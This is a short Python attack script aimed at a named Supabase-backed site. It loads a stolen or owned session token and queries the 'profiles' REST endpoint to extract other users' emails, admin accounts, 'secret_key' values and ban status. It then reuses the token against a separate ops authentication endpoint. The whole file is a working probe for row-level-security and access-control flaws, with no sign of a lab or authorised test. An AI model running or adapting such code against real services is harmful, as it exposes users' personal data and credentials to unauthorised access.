import ssl, json, urllib.request, urllib.error

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, extra=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "apikey": KEY,
        "Authorization": f"Bearer {token or KEY}",
        "X-Client-Info": "supabase-js/2.49.4",
        "Prefer": "return=representation",
        "Content-Type": "application/json;charset=UTF-8",
    }
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

session = json.load(open("token.txt"))
access = session["access_token"]
uid = session["user"]["id"]

print("=== RLS leak tests with my token ===")
for q in [
    "select=*&email=eq.admin@onlyfakeai.ru",
    "select=*&email=eq.onlyfake@tuta.io",
    "select=*&role=eq.admin",
    "select=user_id,email,role,secret_key,banned&limit=5",
    "select=*&user_id=neq." + uid + "&limit=3",
]:
    st, txt = req("GET", f"/rest/v1/profiles?{q}", token=access)
    print(f"\nprofiles?{q} -> {st}")
    print(txt[:400])

print("\n=== ops verify with main-project token ===")
st, txt = req("GET", "https://ops.onlyfakeai.ru/api/auth/verify", token=access)
print(st, txt[:400])
